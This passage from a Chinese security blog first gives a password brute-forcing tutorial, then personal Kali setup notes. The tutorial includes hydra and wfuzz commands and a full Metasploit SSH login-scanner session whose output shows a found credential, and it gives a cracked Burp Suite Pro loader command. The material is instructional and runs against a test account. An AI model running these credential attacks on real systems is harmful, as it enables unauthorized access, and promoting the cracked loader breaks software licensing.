</span><br><span class="line">hydra -l sa -P /root/passlist mssql://192.168.0.103 –vV </span><br></pre></td></tr></table></figure><h2 id="可视化xhydra">可视化xhydra</h2><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210411132818.png" alt="image-20210411132809783"></p><p>没啥好说的,   <img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210411132925.png" alt="image-20210411132919841"></p><h2 id="msf穷举模块">msf穷举模块</h2><p>测试ip:***********</p><p>测试账号:test</p><p>测试密码:123456</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; info</span><br><span class="line"></span><br><span class="line">       Name: SSH Login Check Scanner</span><br><span class="line">     Module: auxiliary/scanner/ssh/ssh_login</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  todb &lt;todb@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name              Current Setting  Required  Description</span><br><span class="line">  ----              ---------------  --------  -----------</span><br><span class="line">  BLANK_PASSWORDS   <span class="literal">false</span>            no        Try blank passwords <span class="keyword">for</span> all users</span><br><span class="line">  BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5</span><br><span class="line">  DB_ALL_CREDS      <span class="literal">false</span>            no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">  DB_ALL_PASS       <span class="literal">false</span>            no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">  DB_ALL_USERS      <span class="literal">false</span>            no        Add all users <span class="keyword">in</span> the current database to the list</span><br><span class="line">  PASSWORD                           no        A specific password to authenticate with</span><br><span class="line">  PASS_FILE                          no        File containing passwords, one per line</span><br><span class="line">  RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;f</span></span><br><span class="line"><span class="string">                                               ile:&lt;path&gt;&#x27;</span></span><br><span class="line">  RPORT             22               yes       The target port</span><br><span class="line">  STOP_ON_SUCCESS   <span class="literal">false</span>            yes       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">  THREADS           1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">  USERNAME                           no        A specific username to authenticate as</span><br><span class="line">  USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per li</span><br><span class="line">                                               ne</span><br><span class="line">  USER_AS_PASS      <span class="literal">false</span>            no        Try the username as the password <span class="keyword">for</span> all users</span><br><span class="line">  USER_FILE                          no        File containing usernames, one per line</span><br><span class="line">  VERBOSE           <span class="literal">false</span>            yes       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module will <span class="built_in">test</span> ssh logins on a range of machines and report</span><br><span class="line">  successful logins. If you have loaded a database plugin and</span><br><span class="line">  connected to a database this module will record successful logins</span><br><span class="line">  and hosts so you can track your access.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  https://cvedetails.com/cve/CVE-1999-0502/</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> RHOSTS *********</span><br><span class="line">RHOSTS =&gt; *********</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> USERNAME <span class="built_in">test</span></span><br><span class="line">USERNAME =&gt; <span class="built_in">test</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> PASS_FILE /root/</span><br><span class="line">.ICEauthority    .config          .hushlogin       .python_history  Desktop          Public</span><br><span class="line">.Xauthority      .dbus            .<span class="built_in">local</span>           .viminfo         Documents        Templates</span><br><span class="line">.bash_history    .face            .msf4            .vnc             Downloads        Videos</span><br><span class="line">.bashrc          .face.icon       .pip             .zsh_history     Music            tools</span><br><span class="line">.cache           .gnupg           .profile         .zshrc           Pictures</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> PASS_FILE /root/tools/穷举工具/pass</span><br><span class="line">passlist      password.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> PASS_FILE /root/tools/穷举工具/password.txt</span><br><span class="line">PASS_FILE =&gt; /root/tools/穷举工具/password.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssh/ssh_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting                Required  Description</span><br><span class="line">   ----              ---------------                --------  -----------</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">false</span>                          no        Try blank passwords <span class="keyword">for</span> all users</span><br><span class="line">   BRUTEFORCE_SPEED  5                              yes       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>                          no        Try each user/password couple stored <span class="keyword">in</span> the current data</span><br><span class="line">                                                              base</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>                          no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>                          no        Add all users <span class="keyword">in</span> the current database to the list</span><br><span class="line">   PASSWORD                                         no        A specific password to authenticate with</span><br><span class="line">   PASS_FILE         /root/tools/穷举工具/password.txt  no        File containing passwords, one per line</span><br><span class="line">   RHOSTS            **********                 yes       The target host(s), range CIDR identifier, or hosts file</span><br><span class="line">                                                               with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT             22                             yes       The target port</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>                          yes       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   THREADS           1                              yes       The number of concurrent threads (max one per host)</span><br><span class="line">   USERNAME          <span class="built_in">test</span>                           no        A specific username to authenticate as</span><br><span class="line">   USERPASS_FILE                                    no        File containing users and passwords separated by space,</span><br><span class="line">                                                              one pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>                          no        Try the username as the password <span class="keyword">for</span> all users</span><br><span class="line">   USER_FILE                                        no        File containing usernames, one per line</span><br><span class="line">   VERBOSE           <span class="literal">false</span>                          yes       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> STOP_ON_SUCCESS teur</span><br><span class="line">[-] The following options failed to validate: Value <span class="string">&#x27;teur&#x27;</span> is not valid <span class="keyword">for</span> option <span class="string">&#x27;STOP_ON_SUCCESS&#x27;</span>.</span><br><span class="line">STOP_ON_SUCCESS =&gt; <span class="literal">false</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; <span class="built_in">set</span> STOP_ON_SUCCESS <span class="literal">true</span></span><br><span class="line">STOP_ON_SUCCESS =&gt; <span class="literal">true</span></span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line"></span><br><span class="line">[+] ************:22 - Success: <span class="string">&#x27;test:123456&#x27;</span> <span class="string">&#x27;Could not chdir to home directory /home/test: No such file or directory This account is currently not available. Could not chdir to home directory /home/test: No such file or directory This account is currently not available. &#x27;</span></span><br><span class="line">[-] *************:22 - While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with <span class="string">&#x27;set gatherproof false&#x27;</span>.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with device details so it can be handled <span class="keyword">in</span> the future.</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/ftp_login auxiliary/scanner/ssh/ssh_login auxiliary/scanner/telnet/telnet_login auxiliary/scanner/smb/smb_login auxiliary/scanner/mssql/mssql_login auxiliary/scanner/mysql/mysql_login auxiliary/scanner/oracle/oracle_login auxiliary/scanner/postgres/postgres_login auxiliary/scanner/vnc/vnc_login auxiliary/scanner/pcanywhere/pcanywhere_login auxiliary/scanner/snmp/snmp_login </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用法</span><br><span class="line">msfconsole</span><br><span class="line">msf auxiliary(mysql_login) &gt; <span class="built_in">set</span> PASS_FILE /root/passlist.txt</span><br><span class="line">PASS_FILE =&gt; /root/passlist.txt</span><br><span class="line">msf auxiliary(mysql_login) &gt; <span class="built_in">set</span> USERNAME root</span><br><span class="line">USERNAME =&gt; root</span><br><span class="line">msf auxiliary(mysql_login) &gt; run</span><br><span class="line"><span class="built_in">set</span> 设置</span><br><span class="line">show options 查询设置</span><br><span class="line">back 返回</span><br><span class="line">info 查询模块的信息</span><br><span class="line">exploit/run 运行模块</span><br></pre></td></tr></table></figure><h2 id="邮箱破解">邮箱破解</h2><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210411140448.png" alt="image-20210411140441052"></p><h2 id="后台密码穷举">后台密码穷举</h2><p>burp下载<a href="https://www.ddosi.com/">🔰雨苁</a><br>打包了份<a href="/burp.exe">启动器</a><br>无后台</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">源代码 就是</span><br><span class="line">java --illegal-access=permit -Dfile.encoding=utf-8 -javaagent:BurpSuiteLoader.jar -noverify -jar burpsuite_pro.jar</span><br></pre></td></tr></table></figure><p>把下载的burp文件重命名如下<br><img src="/image/2021-04-11-23-40-10.png" alt=""><br>该exe使用方法</p><ul><li>创建快捷方式</li><li>固定到开始屏幕</li></ul><p>burploader-old.jar 为激活工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar burploader-old.jar</span><br></pre></td></tr></table></figure><p>使用方法<a href="https://www.ddosi.com/">🔰雨苁</a>博客有</p><p>wordpress</p><ul><li>cmsmap穷举</li></ul><p>一句话破解</p><ul><li>cheetah</li></ul><p>webshell密码破解</p><p>​      验证码后台破解</p><ul><li>验证码cookie是否能重复利用</li><li>能否重复利用</li><li>绕过</li><li>ocr识别</li></ul><p>wfuzz多线程百万密码测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#example</span></span><br><span class="line">wfuzz -c -z file./passwd.txt -u url -d <span class="string">&quot;username=root&amp;passed=FUZZ&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 穷举 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 穷举 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KALI安装备份</title>
      <link href="posts/3cff777/"/>
      <url>posts/3cff777/</url>
      
        <content type="html"><![CDATA[<mark class="hl-label red">此篇不是教程,只是个人备份</mark> <h2 id="花屏解决">花屏解决</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfconf-query -c xfwm4 -p /general/vblank_mode -t string -s <span class="string">&quot;xpresent&quot;</span> --create</span><br></pre></td></tr></table></figure><ul><li>个人碰到问题的解决办法</li></ul><h2 id="开启蓝牙">开启蓝牙</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service bluetooth start</span><br><span class="line">sudo update-rc.d bluetooth <span class="built_in">enable</span></span><br></pre></td></tr></table></figure><h2 id="更改默认dir名">更改默认dir名</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.config/user-dirs.dirs</span><br><span class="line"></span><br><span class="line">XDG_DESKTOP_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Desktop&quot;</span></span><br><span class="line">XDG_DOWNLOAD_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Downloads&quot;</span></span><br><span class="line">XDG_TEMPLATES_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Templates&quot;</span></span><br><span class="line">XDG_PUBLICSHARE_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Public&quot;</span></span><br><span class="line">XDG_DOCUMENTS_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Documents&quot;</span></span><br><span class="line">XDG_MUSIC_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Music&quot;</span></span><br><span class="line">XDG_PICTURES_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Pictures&quot;</span></span><br><span class="line">XDG_VIDEOS_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Videos&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">mv 公共 Public</span><br><span class="line">mv 模板 Templates</span><br><span class="line">mv 视频 Videos</span><br><span class="line">mv 图片 Pictures</span><br><span class="line">mv 文档 Documents</span><br><span class="line">mv 下载 Downloads</span><br><span class="line">mv 音乐 Music</span><br><span class="line">mv 桌面 Desktop</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="更改默认python为3">更改默认python为3</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2 100</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 150</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="更改默认源">更改默认源</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.huaweicloud.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#deb-src https://mirrors.huaweicloud.com/kali kali-rolling main non-free contrib </span></span><br><span class="line"><span class="comment">#deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="comment">#deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"><span class="comment">#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安装apt-fast加速更新源">安装apt-fast加速更新源</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list.d/apt-fast.list</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://ppa.launchpad.net/apt-fast/stable/ubuntu bionic main</span><br></pre></td></tr></table></figure><h3 id="添加签名">添加签名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key adv --keyserver keys.gnupg.net --recv-keys 1EE2FF37CA8DA16B</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install apt-fast</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>依次选择 apt — 16 — 是</p><p>修改apt-fast设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt-fast.conf</span><br><span class="line"><span class="comment">#添加以下配置</span></span><br><span class="line"></span><br><span class="line">MIRRORS=( <span class="string">&#x27;https://mirrors.huaweicloud.com/kali, https://mirrors.ustc.edu.cn/kali, https://mirrors.aliyun.com/kali, https://mirrors.tuna.tsinghua.edu.cn/kali&#x27;</span> )</span><br></pre></td></tr></table></figure><h2 id="更改apt-fast为af">更改apt-fast为af</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.zshrc</span><br><span class="line"><span class="comment">#添加如下</span></span><br><span class="line"><span class="built_in">alias</span> af=<span class="string">&#x27;sudo apt-fast&#x27;</span></span><br><span class="line"><span class="comment">#更新.zshrc文件</span></span><br><span class="line"><span class="built_in">source</span> .zshrc</span><br></pre></td></tr></table></figure><p>更新系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">af update</span><br><span class="line">af upgrade</span><br></pre></td></tr></table></figure><h2 id="安装python3-pip">安装python3-pip</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">af install python3-pip</span><br><span class="line">sudo mkdir ~/.pip</span><br><span class="line">sudo vim ~/.pip/pip.conf</span><br><span class="line"><span class="comment">#添加如下内容</span></span><br><span class="line">[global]</span><br><span class="line">index-url = https://mirrors.huaweicloud.com/repository/pypi/simple</span><br><span class="line">trusted-host = mirrors.huaweicloud.com</span><br><span class="line">timeout = 120</span><br></pre></td></tr></table></figure><h2 id="禁用读文件时访问时间戳的写操作">禁用读文件时访问时间戳的写操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#为除swap之外的每个分区增加noatime选项</span></span><br><span class="line">sudo vim /etc/fstab</span><br><span class="line">noatime,errors=remount-ro</span><br><span class="line"><span class="comment">#重启生效</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210403141014.png" alt="image-20210403141007165"></p><h2 id="使用TRIM定期清理硬盘-ssd">使用TRIM定期清理硬盘(ssd)</h2><h3 id="查看是否支持">查看是否支持</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo hdparm -I /dev/sda | grep TRIM</span><br><span class="line"><span class="comment">#有返回则支持</span></span><br><span class="line">sudo systemctrl status fstrim</span><br></pre></td></tr></table></figure><h3 id="手动执行">手动执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo fstrim -V /</span><br><span class="line"><span class="comment">#多块可选择硬盘挂载目录</span></span><br></pre></td></tr></table></figure><h3 id="每天清理-默认每周-—SSD">每天清理(默认每周)—SSD</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -V /etc/systemd/system/fstrim.timer.d</span><br><span class="line">sudo touch /etc/systemd/system/fstrim.timer.d/override.conf</span><br><span class="line">sudo vim admin:///etc/systemd/system/fstrim.timer.d/override.conf</span><br><span class="line">[Timer]</span><br><span class="line">OnCalendar=</span><br><span class="line">OnCalendar=daily</span><br></pre></td></tr></table></figure><h2 id="提高性能-安全补丁">提高性能,安全补丁</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#intel</span></span><br><span class="line">sudo apt install intel-microcode</span><br><span class="line"><span class="comment">#amd</span></span><br><span class="line">sudo apt install amd64-microcode</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210403142430.png" alt="image-20210403142423911"></p><h2 id="交换分区-文件">交换分区/文件</h2><ul><li>Swappiness 内核参数(0-100)</li><li>决定RAM写入SWAP的百分比</li><li>减少使用SWAP可以提高性能</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/vm/swappiness <span class="comment">#默认60</span></span><br><span class="line">sudo sysctl -w vm.swappiness=1  <span class="comment">#设置为1    1-10 都行</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210403143159.png" alt="image-20210403143153171"></p><h2 id="限制firefox磁盘读写">限制firefox磁盘读写</h2><ul><li><p>将firefox网络缓存放入RAM可提高运行速度</p><p>​-------内存不足2GB不建议使用</p></li></ul><p>地址栏输入about:config</p><p>搜索: brower.cache.disk.enable   #更改为false    双击</p><p>搜索: brower.cache.memory.enable #true</p><p>搜索 browser.cache.memory.capacity 数值更改为204800</p><p><img src="https://cdn.jsdelivr.net/gh/dansemal/picture_1/20210403144502.png" alt="image-20210403144456822"></p><h3 id="禁用firefox无必要的网络活动">禁用firefox无必要的网络活动</h3><p>地址栏输入about:config</p><p>搜索: network.captive-portal-service.enabled #更改为false</p><h2 id="禁用休眠-碎片整理">禁用休眠/碎片整理</h2><p>禁用休眠</p><ul><li>磁盘挂旗会导致大量的写操作</li><li>对SSD尤其不利</li></ul><p>不要碎片整理</p><ul><li>碎片整理会导致大量的写操作,短时间内毁坏SSD</li></ul><h2 id="优化启动项">优化启动项</h2><p>删除不需要的启动项</p><p>显示隐藏启动项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&#x27;s/NoDisplay=true/NoDisplay=false/g&#x27;</span> /etc/xdg/autostart/*.desktop</span><br></pre></td></tr></table></figure><h2 id="系统清理">系统清理</h2><p>stacer</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">af install stacer</span><br></pre></td></tr></table></figure><p>bleachbit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">af install bleachbit</span><br></pre></td></tr></table></figure><h2 id="优化笔记本电池寿命">优化笔记本电池寿命</h2><p>手动优化非常复杂</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#推荐软件</span></span><br><span class="line">af install tlp tlp-rdw</span><br><span class="line">sudo tlp start</span><br><span class="line">sudo tlp-stat</span><br></pre></td></tr></table></figure><p>我用服务器演示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 